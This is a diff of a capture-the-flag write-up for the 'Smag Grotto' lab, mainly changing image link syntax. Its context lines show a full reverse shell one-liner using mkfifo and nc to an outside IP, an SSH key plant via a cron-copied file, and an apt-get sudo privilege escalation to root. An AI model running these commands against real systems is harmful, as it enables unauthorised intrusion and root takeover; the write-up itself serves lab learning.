@@ -138,14 +138,14 @@ netadmin@smag.thm
 uzi@smag.thm
 The site also gives us a PCAP file. 
 
-![[Pasted image 20250625122254.png]]
+![Pasted image 20250625122254.png](assets/smag-grotto/Pasted%20image%2020250625122254.png)
 
 Analyzing the PCAP gives us **username and password** as well as **another endpoint** `development.smag.thm/login.php` which we add to our `/etc/hosts`
 
-![[Pasted image 20250625122737.png]]
+![Pasted image 20250625122737.png](assets/smag-grotto/Pasted%20image%2020250625122737.png)
  logging in with the creds from PCAP file:
  
- ![[Pasted image 20250625122844.png]]
+ ![Pasted image 20250625122844.png](assets/smag-grotto/Pasted%20image%2020250625122844.png)
 We try running the commands but do not see any output. We can try to get a reverse shell.
 
 Using the payload for reverse shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.138.250 4444 >/tmp/f`
@@ -176,10 +176,10 @@ As per the last entry, in crontab file Every minute, the root user copies the co
 Since we have write permissions to this file, we can leverage this by copying our own ssh public key and ssh as jake. 
 Generating our own key using ssh-keygen: `ssh-keygen -t rsa -b 2048 -f /tmp/mykey:`
 We can now obtain the user flag.
-![[Pasted image 20250625152145.png]]
+![Pasted image 20250625152145.png](assets/smag-grotto/Pasted%20image%2020250625152145.png)
 
 running `sudo -l` gives us the following output: 
-![[Pasted image 20250625152546.png]]
+![Pasted image 20250625152546.png](assets/smag-grotto/Pasted%20image%2020250625152546.png)
 
 this shows that jake can run `apt-get`.  Using [gtfobins](https://gtfobins.github.io/gtfobins/apt-get/) we can easily escalate out privileges to root
 Using `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` we escalate to root and obtain the root flag.
